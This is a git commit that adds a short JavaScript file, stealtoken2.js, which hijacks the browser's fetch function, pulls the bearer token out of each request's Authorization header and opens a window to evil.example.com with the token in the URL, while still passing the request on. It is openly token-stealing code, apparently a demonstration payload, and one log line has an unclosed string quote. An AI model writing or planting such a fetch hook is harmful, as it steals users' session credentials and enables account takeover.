564990ec9415c2b463ebbad556f57ba05b07fb85
Simon <32738398+shuesken@users.noreply.github.com>
2025-02-13 15:10:44 +0100

    Create stealtoken2.js

---
+++ stealtoken2.js
@@ -0,0 +1,16 @@
+console.log('proxying fetch in window')
+
+window.fetch = new Proxy(window.fetch, {
+    apply(actualFetch, that, args) {
+	console.log('intercepting fetch)
+	const authHeader = args?.at(1)?.headers?.get('authorization')
+	const token = authHeader?.split(' ').at(1)
+	if (token) {
+	        const evilUrl = `https://evil.example.com/?token=${token}`
+	        window.open(evilUrl, '_blank').focus();
+	}
+				
+        const result = Reflect.apply(actualFetch, that, args);
+        return result;
+    }
+});
